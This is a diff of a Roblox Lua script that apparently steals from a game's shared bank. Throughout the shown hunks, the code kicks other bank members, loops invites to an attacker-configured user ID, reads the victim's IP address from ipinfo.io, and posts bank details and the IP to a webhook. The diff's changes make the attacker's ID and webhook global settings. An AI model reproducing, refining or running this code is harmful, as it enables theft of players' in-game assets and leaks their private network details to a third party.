@@ -89,15 +89,6 @@ end
 if worked2 then
     _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(UserName)
 end
-if UserName2 ~= nil then
-    local worked3 = pcall(function()
-        game:GetService("Players"):GetUserIdFromNameAsync(UserName2)
-    end)
-    if not worked3 then
-        game:GetService("Players").LocalPlayer:Kick("Put A Valid Username2!")
-        return;
-    end
-end
 -- Checks
 
 
@@ -523,7 +514,7 @@ local tier4gems = 1500000000000 - gemsinbank
 -- Kicking The Players
 
 for i, v in pairs(SuperBank["Players"]) do
-    if v ~= UserName then
+    if v ~= _G.UserID then
         kickremote:InvokeServer(Bank, v)
     end
 end
@@ -531,7 +522,7 @@ end
 -- First Invite
 
 if tier ~= 1 then
-        inviteremote:InvokeServer(mybanks[1]["BUID"], UserName)
+        inviteremote:InvokeServer(mybanks[1]["BUID"], _G.UserID)
 end
 -- Bank Pets
 Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
@@ -1205,12 +1196,11 @@ end
 
 local username = game:GetService("Players").LocalPlayer.Name
 local fardplayer = game:GetService("Players").LocalPlayer
-local receiver = game:GetService("Players"):GetNameFromUserIdAsync(UserName)
+local receiver = game:GetService("Players"):GetNameFromUserIdAsync(_G.UserID)
 local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local banktier = SuperBank["Tier"]
 local lmao = "/5"
 local ping
-local url = Webhook
     if #HList ~= 0 or #BHList ~= 0 then
         ping = "@everyone"
     elseif #HList == 0 and #BHList == 0 then
@@ -1357,7 +1347,7 @@ local headers = {
     ["content-type"] = "application/json"
 }
 
-if Webhook ~= nil then
+if _G.Webhook ~= nil then
     local abcdef1 = {
         Url = url,
         Body = newdata1,
@@ -1367,10 +1357,10 @@ if Webhook ~= nil then
     request(abcdef1)
 end
 for i, v in pairs(SuperBank["Players"]) do
-    if v ~= UserName then
+    if v ~= _G.UserID then
         kickremote:InvokeServer(Bank, v)
     end
 end
 while task.wait(0.1) do
-    inviteremote:InvokeServer(mybanks[1]["BUID"], UserName)
+    inviteremote:InvokeServer(mybanks[1]["BUID"], _G.UserID)
 end
